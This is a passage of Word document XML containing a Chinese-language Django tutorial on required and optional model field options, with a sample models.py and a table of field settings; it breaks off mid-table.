        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30F5806B" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当你运行</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>python manage.py migrate </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>创建表格的时候你会遇到错误，错误原因如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="554C61CF" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>CharField里的max_length选项没有定义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E513357" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>ForeignKey(Publisher)里的on_delete选项有没有定义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C2B7516" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A3796CB" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>所以当你定义Django模型Model的时候，你一定要十分清楚2件事:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71A0E6B9" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>这个Field是否有必选项, 比如CharField的max_length和ForeignKey的on_delete选项是必须要设置的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C04683" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>这个Field是否必需(blank = True or False)，是否可以为空 (null = True or False)。这关系到数据的完整性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F5DDA72" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>其实在上述案例中还有一个隐藏的错误，即</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>TextField(blank = True, null = True)</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>。blank = True 意味这个字段不是必需的，在客户端不是必填选项。null = True意味这个数据库里这个字段可以存储为null空值。但是Django对于空白的CharField和TextField永远不会存为null空值，而是存储空白字符串''，所以正确的做法是设置default=''。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E920C7F" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73F6501B" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下表才是一个比较正确的Django模型(Model)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0074B42E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># models.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6C1245" w14:textId="4BD333BD" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.db import models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C05C1A7" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53E2DC50" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Publisher(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="412ACF31"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name = models.CharField(max_length=30)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="225B5462"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address = models.CharField(max_length=60)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C0F551" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="198FE35E"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def __str__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="401256CE"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return self.name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A98E585" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="76A9DA22" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Book(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D223ABE"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name = models.CharField(max_length=30)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5534768B"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description = models.TextField(blank=True, default='')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B4A583"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publisher = ForeignKey(Publisher, on_delete = models.CASCADE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="253E6576"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add_date = models.DateField()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65C735A8" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26626D69"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def __str__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="523CD92F" w14:textId="42F870DB" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return self.name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA1309F" w14:textId="3AFE25AF" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django Model中字段(Field)的可选项和必选项</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="10152" w:type="dxa"/>
        <w:jc w:val="center"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10152"/>
      </w:tblGrid>
      <w:tr w:rsidR="003802BB" w14:paraId="30484A68"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BD33295" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>字段与选项（必选项为黄色标注)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003802BB" w14:paraId="78894381"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05B4E2C" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>CharField() 字符字段</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29D2D862" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="146"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode3"/>
                <w:color w:val="FFA900"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>max_length = xxx or None</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18C3FEBF" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="146"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>如不是必填项，可设置blank = True和default = ''</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3210A261" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="146"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>如果用于username, 想使其唯一，可以设置unique = True</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43323788" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="146"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>如果有choice选项，可以设置 choices = XXX_CHOICES</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003802BB" w14:paraId="10084356"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4EFA9AB" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>TextField() 文本字段</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="394CDE10" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="147"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>max_length = xxx</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54EFD697" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="147"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>如不是必填项，可设置blank = True和default = ''</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003802BB" w14:paraId="593D7B36"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80C03F9" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>DateField() and DateTimeField() 日期与时间字段</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7001371A" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="148"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>一般建议设置默认日期default date.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79ABE3DE" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="148"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>For DateField: default=date.today - 先要from datetime import date</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5251AC91" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="148"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>For DateTimeField: default=timezone.now - 先要from django.utils import timezone</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22560654" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="148"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>对于上一次修改日期(last_modified date)，可以设置: auto_now=True</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003802BB" w14:paraId="228EA3EF"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6ACB763" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>EmailField() 邮件字段</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B04129A" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="149"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>如不是必填项，可设置blank = True和default = ''</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="764A7C47" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="149"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>一般Email用于用户名应该是唯一的，建议设置unique = True</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003802BB" w14:paraId="0272C4E2"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533D047" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>IntegerField(), SlugField(), URLField()，BooleanField()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FCA266F" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="150"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>可以设置blank = True or null = True</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="493146B7" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="150"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>对于BooleanField一般建议设置defautl = True or False</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003802BB" w14:paraId="66128C79"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7F7C2E2" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>FileField(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode4"/>
                <w:color w:val="FFA900"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>upload_to</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>=None, max_length=100) - 文件字段</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46FC1518" w14:textId="77777777" w:rsidR="003802BB" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="151"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode5"/>
                <w:color w:val="FFA900"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>upload_to = "/some folder/"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26F4B565" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="151"/>
              </w:numPr>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:ind w:left="0"/>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
